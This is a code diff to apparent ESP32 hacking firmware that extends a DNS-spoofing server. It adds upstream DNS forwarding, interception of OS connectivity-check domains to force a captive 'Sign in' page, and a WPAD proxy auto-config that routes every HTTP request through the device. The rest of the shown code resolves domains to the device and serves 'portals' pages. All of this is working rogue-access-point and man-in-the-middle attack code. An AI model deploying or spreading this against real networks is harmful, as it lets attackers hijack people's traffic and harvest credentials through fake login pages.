@@ -106,7 +106,17 @@ void DnsSpoofServer::_processDns()
   // Only respond to A record queries (type 1)
   if (qtype != 1) return;
 
-  // Resolve ALL domains to ESP32 IP
+  // Forward unconfigured domains to upstream DNS (if set)
+  if (!_findPath(domain) && _upstreamDns != IPAddress(0, 0, 0, 0)) {
+    if (_captiveIntercept && _isCaptiveDomain(domain)) {
+      // fall through to resolve to our IP
+    } else {
+      _forwardDns(buf, len);
+      return;
+    }
+  }
+
+  // Resolve domain to ESP32 IP
   buf[2] = 0x84; // QR=1, AA=1
   buf[3] = 0x00; // RCODE=0
   buf[6] = 0x00; buf[7] = 0x01; // ANCOUNT=1
@@ -126,6 +136,35 @@ void DnsSpoofServer::_processDns()
   _dnsUdp.beginPacket(_dnsUdp.remoteIP(), _dnsUdp.remotePort());
   _dnsUdp.write(buf, pos);
   _dnsUdp.endPacket();
+}
+
+void DnsSpoofServer::_forwardDns(uint8_t* buf, int len)
+{
+  // Forward the original query to the upstream DNS server
+  WiFiUDP fwd;
+  fwd.begin(0); // ephemeral port
+  fwd.beginPacket(_upstreamDns, 53);
+  fwd.write(buf, len);
+  fwd.endPacket();
+
+  // Wait for response (up to 2s)
+  unsigned long start = millis();
+  while (millis() - start < 2000) {
+    int rlen = fwd.parsePacket();
+    if (rlen > 0 && rlen <= 512) {
+      uint8_t rbuf[512];
+      fwd.read(rbuf, rlen);
+      fwd.stop();
+
+      // Relay the upstream response back to the original client
+      _dnsUdp.beginPacket(_dnsUdp.remoteIP(), _dnsUdp.remotePort());
+      _dnsUdp.write(rbuf, rlen);
+      _dnsUdp.endPacket();
+      return;
+    }
+    delay(10);
+  }
+  fwd.stop();
 }
 
 bool DnsSpoofServer::_matchDomain(const char* query, const char* config)
@@ -151,11 +190,29 @@ const char* DnsSpoofServer::_findPath(const char* domain)
   return nullptr;
 }
 
+bool DnsSpoofServer::_isCaptiveDomain(const char* domain)
+{
+  return strcasestr(domain, "captive.apple") ||
+         strcasecmp(domain, "connectivitycheck.gstatic.com") == 0 ||
+         strcasecmp(domain, "clients3.google.com") == 0 ||
+         strcasecmp(domain, "www.msftconnecttest.com") == 0 ||
+         strcasecmp(domain, "nmcheck.gnome.org") == 0 ||
+         strcasecmp(domain, "detectportal.firefox.com") == 0;
+}
+
 // ── Web Server (Port 80) ───────────────────────────────────────────────────
 
 void DnsSpoofServer::_startWeb()
 {
   _webServer = new AsyncWebServer(80);
+
+  // WPAD proxy auto-config — routes all HTTP through us
+  _webServer->on("/wpad.dat", HTTP_GET, [this](AsyncWebServerRequest* req) {
+    String pac = "function FindProxyForURL(url, host) {\n"
+                 "  return \"PROXY " + _apIP.toString() + ":80\";\n"
+                 "}\n";
+    req->send(200, "application/x-ns-proxy-autoconfig", pac);
+  });
 
   _webServer->onNotFound([this](AsyncWebServerRequest* req) {
     if (!Uni.Storage) {
@@ -208,27 +265,29 @@ void DnsSpoofServer::_startWeb()
 
     // unigeek.local → redirect to Web File Manager on port 8080
     if (_fileManagerEnabled && host.equalsIgnoreCase("unigeek.local")) {
-      String url = "http://" + WiFi.softAPIP().toString() + ":8080" + req->url();
+      String url = "http://" + _apIP.toString() + ":8080" + req->url();
       req->redirect(url);
       return;
     }
 
-    // Connectivity checks → captive page or 204
-    bool isCheck = host.indexOf("captive.apple") >= 0 ||
-                   host.equalsIgnoreCase("connectivitycheck.gstatic.com") ||
-                   host.equalsIgnoreCase("clients3.google.com") ||
-                   host.equalsIgnoreCase("www.msftconnecttest.com") ||
-                   host.equalsIgnoreCase("nmcheck.gnome.org") ||
-                   host.equalsIgnoreCase("detectportal.firefox.com");
-    if (isCheck) {
-      if (_captivePath[0] != '\0') { _serveFromPath(_captivePath, req); }
-      else { req->send(204); }
+    // Connectivity checks
+    if (_isCaptiveDomain(host.c_str())) {
+      if (_captiveIntercept) {
+        if (_captivePath[0] != '\0') { _serveFromPath(_captivePath, req); }
+        else { req->send(200, "text/html", "<html><body>Sign in</body></html>"); }
+      } else {
+        req->send(204); // pass connectivity check
+      }
       return;
     }
 
-    // Configured domain or fallback to portals/default
+    // Configured domain or fallback
     const char* p = _findPath(host.c_str());
-    _serveFromPath(p ? p : "/unigeek/wifi/portals/default", req);
+    if (p) {
+      _serveFromPath(p, req);
+    } else {
+      _serveFromPath("/unigeek/wifi/portals/default", req);
+    }
   });
 
   _webServer->begin();
